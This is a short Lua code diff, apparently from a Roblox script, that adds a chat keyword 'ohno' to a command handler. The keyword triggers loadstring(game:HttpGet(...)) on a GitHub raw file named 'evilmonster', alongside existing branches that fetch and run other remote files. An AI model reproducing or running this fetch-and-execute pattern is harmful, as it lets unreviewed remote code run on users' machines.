@@ -18,6 +18,8 @@ local function runCommand(msg)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/blob/main/sand"))()
 	elseif string.find(m,"test",1,true) then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/refs/heads/main/Test"))()
+    elseif string.find(m, "ohno", 1, true) then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/refs/heads/main/evilmonster"))()
 	end
 end
 
